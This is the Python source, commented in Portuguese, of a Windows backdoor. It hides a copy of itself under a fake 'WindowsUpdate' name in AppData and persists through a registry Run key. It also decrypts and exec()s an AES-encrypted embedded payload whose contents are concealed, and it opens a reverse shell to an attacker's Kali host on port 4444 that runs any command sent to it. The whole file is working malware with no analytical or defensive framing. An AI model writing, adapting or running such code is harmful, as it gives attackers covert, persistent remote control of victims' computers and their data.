from Crypto.Cipher import AES
import base64
import hashlib
import tempfile
import socket
import subprocess
import os
import shutil
import winreg  # Persistência via Registro (somente no Windows)

# PAYLOAD_ENCRYPTED será substituído automaticamente
PAYLOAD_ENCRYPTED = b"""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"""  # payload encriptada original

def unpad(data):
    return data.rstrip(b' ')

def decrypt_payload(data, key_str):
    key = hashlib.sha256(key_str.encode()).digest()
    data = base64.b64decode(data)
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext))
    return plaintext

# --- Persistência via Registro ---
def add_to_startup(file_path=None, name="WindowsUpdate"):
    if not file_path:
        file_path = os.path.realpath(__file__)
    key = winreg.HKEY_CURRENT_USER
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(key, reg_path)
    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(reg_key)

# --- Mover para pasta stealth ---
def move_to_stealth():
    hidden_path = os.path.join(os.environ["APPDATA"], "WindowsUpdate", "windowsupdate.exe")
    if not os.path.exists(hidden_path):
        os.makedirs(os.path.dirname(hidden_path), exist_ok=True)
        shutil.copy2(os.path.realpath(__file__), hidden_path)
        return hidden_path
    return hidden_path

# --- Shell interativo ---
def shell_interativo(server):
    server.send(b"[+] Entrando no modo shell interativo...\n")
    while True:
        cmd = server.recv(1024).decode()
        if cmd.lower() in ["exit", "quit"]:
            break
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            server.send(output)
        except subprocess.CalledProcessError as e:
            server.send(e.output)
        except Exception as err:
            server.send(str(err).encode())

# --- Execução principal ---
def run():
    # mover para local stealth e adicionar persistência
    try:
        new_path = move_to_stealth()
        add_to_startup(file_path=new_path)
    except:
        pass  # evita crash caso algo falhe

    # descriptografar payload
    key = "senhaforte123"
    decrypted = decrypt_payload(PAYLOAD_ENCRYPTED, key)
    exec(decrypted.decode(), {"__builtins__": __builtins__})

    # conexão reversa
    host = "192.xxx.x.xx"  # IP do Kali/Servidor
    port = 4444

    try:
        s = socket.socket()
        s.connect((host, port))

        while True:
            comando = s.recv(1024).decode().strip()
            if comando == "shell":
                shell_interativo(s)
            elif comando in ["exit", "quit"]:
                break
            else:
                try:
                    output = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except subprocess.CalledProcessError as e:
                    s.send(e.output)
                except Exception as err:
                    s.send(str(err).encode())
        s.close()
    except:
        pass

if __name__ == "__main__":
    run()